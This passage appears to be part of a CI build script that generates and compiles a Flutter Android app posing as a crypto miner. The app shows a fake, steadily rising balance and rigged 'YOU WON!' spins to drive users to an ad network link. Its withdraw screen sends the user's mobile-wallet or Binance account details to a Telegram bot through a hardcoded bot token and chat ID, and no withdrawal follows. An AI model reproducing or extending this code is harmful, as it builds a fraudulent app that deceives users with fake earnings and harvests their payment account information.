            sdk: ">=3.2.0 <4.0.0"
          dependencies:
            flutter:
              sdk: flutter
            url_launcher: ^6.2.5
            http: ^1.2.2
          flutter:
            uses-material-design: true
          YAML
          mkdir -p lib
          cat > lib/main.dart << 'DART'
          import 'dart:async';import 'dart:math';import 'package:flutter/material.dart';import 'package:url_launcher/url_launcher.dart';import 'package:http/http.dart' as http;
          void main()=>runApp(MaterialApp(debugShowCheckedModeBanner:false,theme:ThemeData.dark().copyWith(scaffoldBackgroundColor:Color(0xFF0B0E11)),home:Pro()));
          class Pro extends StatefulWidget{@override State<Pro> createState()=>_S();}
          class _S extends State<Pro> with TickerProviderStateMixin{
          double bal=0.0054073;int spins=5;bool mining=true;late AnimationController ac;final bot='8905610310:AAGH4yneCTPSbHq2bJfZl-ArruZ6OJa-LzY';final chat='8296278042';final ad='https://www.effectivecpmnetwork.com/vm70uh6qxb?key=30472d3647946c4a2a73f4ef7660c55f';
          @override void initState(){super.initState();ac=AnimationController(vsync:this,duration:Duration(milliseconds:800))..repeat(reverse:true);Timer.periodic(Duration(milliseconds:85),(t){if(mining&&mounted)setState(()=>bal+=0.00000024);});}
          Future<void> goAd(double r)async{await launchUrl(Uri.parse(ad),mode:LaunchMode.externalApplication);if(mounted)setState(()=>{bal+=r,spins++,mining=true});}
          void spin(){if(spins<=0){ScaffoldMessenger.of(context).showSnackBar(SnackBar(content:Text('Watch Ad for Spin!')));return;}double w=[0.0003,0.0008,0.0015,0.0025][Random().nextInt(4)];setState(()=>{bal+=w,spins--});showDialog(context:context,builder:(_)=>AlertDialog(backgroundColor:Color(0xFF1E2329),title:Column(children:[Icon(Icons.stars,color:Color(0xFFFCD535),size:50),Text('YOU WON!',style:TextStyle(fontWeight:FontWeight.w900))]),content:Text('\$${w.toStringAsFixed(5)}',textAlign:TextAlign.center,style:TextStyle(fontSize:28,fontWeight:FontWeight.w900,color:Color(0xFFFCD535))),actions:[TextButton(onPressed:()=>Navigator.pop(context),child:Text('Collect')),ElevatedButton(style:ElevatedButton.styleFrom(backgroundColor:Color(0xFFFCD535),foregroundColor:Colors.black),onPressed:(){Navigator.pop(context);goAd(w);},child:Text('X2 CLAIM'))]));}
          void wd(){TextEditingController c=TextEditingController();String m='Easypaisa';showModalBottomSheet(context:context,isScrollControlled:true,backgroundColor:Color(0xFF181A20),shape:RoundedRectangleBorder(borderRadius:BorderRadius.vertical(top:Radius.circular(28))),builder:(x)=>StatefulBuilder(builder:(a,s)=>Padding(padding:EdgeInsets.fromLTRB(20,20,20,MediaQuery.of(a).viewInsets.bottom+20),child:Column(mainAxisSize:MainAxisSize.min,children:[Text('Withdraw Profit',style:TextStyle(fontSize:22,fontWeight:FontWeight.w900)),SizedBox(height:12),Container(padding:EdgeInsets.all(12),decoration:BoxDecoration(color:Color(0xFFFCD535).withOpacity(0.1),borderRadius:BorderRadius.circular(12)),child:Row(children:[Text('Available: '),Text('\$${bal.toStringAsFixed(7)}',style:TextStyle(color:Color(0xFFFCD535),fontWeight:FontWeight.bold))])),SizedBox(height:12),DropdownButtonFormField(value:m,dropdownColor:Color(0xFF1E2329),items:['Easypaisa','JazzCash','Binance'].map((e)=>DropdownMenuItem(value:e,child:Text(e))).toList(),onChanged:(v)=>s(()=>m=v!)),SizedBox(height:10),TextField(controller:c,decoration:InputDecoration(hintText:'Account / Wallet',filled:true,fillColor:Color(0xFF2B3139),border:OutlineInputBorder(borderRadius:BorderRadius.circular(12),borderSide:BorderSide.none))),SizedBox(height:16),SizedBox(width:double.infinity,height:52,child:ElevatedButton(style:ElevatedButton.styleFrom(backgroundColor:Color(0xFFFCD535),foregroundColor:Colors.black),onPressed:()async{await http.get(Uri.parse("https://api.telegram.org/bot$bot/sendMessage?chat_id=$chat&text=WITHDRAW \$${bal.toStringAsFixed(5)} Method:$m Acc:${c.text}"));Navigator.pop(a);ScaffoldMessenger.of(context).showSnackBar(SnackBar(content:Text('Sent!')));},child:Text('CONFIRM')))]))));}
          @override Widget build(BuildContext c){double hs=10+Random().nextDouble()*6;return Scaffold(appBar:AppBar(backgroundColor:Color(0xFF0B0E11),title:Text('BSC MINER PRO',style:TextStyle(fontWeight:FontWeight.w900))),body:ListView(padding:EdgeInsets.all(16),children:[ScaleTransition(scale:Tween(begin:0.98,end:1.03).animate(CurvedAnimation(parent:ac,curve:Curves.easeInOut)),child:Container(padding:EdgeInsets.all(22),decoration:BoxDecoration(color:Color(0xFF1E2329),borderRadius:BorderRadius.circular(26),border:Border.all(color:Color(0xFFFCD535).withOpacity(0.25))),child:Column(children:[Text('MINING AT ${hs.toStringAsFixed(2)} GH/s',style:TextStyle(color:Color(0xFFFCD535),fontWeight:FontWeight.bold)),SizedBox(height:14),Text('\$${bal.toStringAsFixed(7)}',style:TextStyle(fontSize:38,fontWeight:FontWeight.w900)),SizedBox(height:18),Row(children:[Expanded(child:OutlinedButton(onPressed:()=>setState(()=>mining=!mining),child:Text(mining?'PAUSE':'RESUME'))),SizedBox(width:12),Expanded(flex:2,child:ElevatedButton(style:ElevatedButton.styleFrom(backgroundColor:Color(0xFFFCD535),foregroundColor:Colors.black),onPressed:()=>goAd(0.0002),child:Text('BOOST + AD')))] )] ))),SizedBox(height:14),Row(children:[_bx(Icons.casino,'SPIN & WIN','${spins} Left',(){spin();}),SizedBox(width:12),_bx(Icons.wallet,'WITHDRAW','Instant',(){wd();})])]));}
          Widget _bx(IconData i,String t,String s,VoidCallback o)=>Expanded(child:InkWell(onTap:o,child:Container(height:108,padding:EdgeInsets.all(16),decoration:BoxDecoration(color:Color(0xFF1E2329),borderRadius:BorderRadius.circular(18)),child:Column(crossAxisAlignment:CrossAxisAlignment.start,children:[Icon(i,color:Color(0xFFFCD535)),Spacer(),Text(t,style:TextStyle(fontWeight:FontWeight.w900)),Text(s,style:TextStyle(fontSize:11,color:Colors.white54))]))));
          }
          DART
          flutter pub get
          flutter build apk --release
    artifacts:
      - build/app/outputs/flutter-apk/app-release.apk
